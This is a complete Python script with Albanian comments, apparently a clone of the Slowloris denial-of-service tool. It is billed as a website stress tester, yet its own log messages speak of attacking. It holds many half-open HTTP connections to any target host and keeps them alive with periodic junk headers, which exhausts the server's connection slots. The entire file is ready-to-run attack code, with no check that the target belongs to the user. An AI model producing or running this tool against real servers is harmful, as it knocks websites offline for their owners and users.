# /**************************\
# |   ---  Agon Hoxha  ---   |
# |  Python aplikacion, per  |
# |    site stres testim.    |
# \**************************/

import argparse
import logging
import random
import socket
import ssl
import sys
import time

parser = argparse.ArgumentParser(description="IS Stresser - stress test tool i thjeshte.", add_help=False)
parser.add_argument('host', nargs="?", help="Caku qe do e stresojme.")
parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='Shfaq kete pamje me instruksione.')
parser.add_argument('-p', '--port', default=80, help="Porti i cakut (default 80).", type=int)
parser.add_argument('-s', '--sockets', default=100, help="Numri i sockets qe do perdoret per test (default 100).", type=int)
parser.add_argument('-d', '--detaje', dest="verbose", action="store_true", help="Shfaq informata shtese gjate ekzekutimit (verbose).")
parser.add_argument('-r', '--random-ua', dest="randuseragent", action="store_true", help="Perdor user-agent te rastesishem.")
parser.add_argument('-q', '--qete', dest="quiet", action="store_true", help="Nuk shfaq asgje gjate ekzekutimit.")
parser.add_argument("--https", dest="https", action="store_true", help="Perdor HTTPS per requests.")

parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(https=False)
parser.set_defaults(quiet=False)

args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit()

if args.verbose and args.quiet:
    print("Perodr vetem -d ose -q!")
    sys.exit()
else:
    if args.verbose:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
    elif args.quiet:
        logging.basicConfig(level=logging.CRITICAL)
    else:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

list_of_sockets = []

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
]

logging.info("\nAutori: Agon Hoxha \nVersioni: 1.0")

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if args.https:
        s = ssl.wrap_socket(s)

    s.connect((ip, args.port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Sulmojme %s me %s socket.", ip, socket_count)
    logging.info("Krijojme socketet.")
    for _ in range(socket_count):
        try:
            logging.debug("Krijojme socket nr %s", _)
            s = init_socket(ip)
        except socket.error:
            logging.info("Problem me rrjetin.")
            break
        list_of_sockets.append(s)
    while True:
        try:
            logging.info("Dergojme keep-alive headers. Numri i sockets: %s", len(list_of_sockets))
            for s in list(list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s) 

            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Rikrijojme socketet.")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error:
                    logging.info("Probleme me rrjetin.")
                    break
            time.sleep(15)
        
        except (KeyboardInterrupt, SystemExit):
            logging.info("Sulmi u ndal.")
            break

if __name__ == "__main__":
    main()
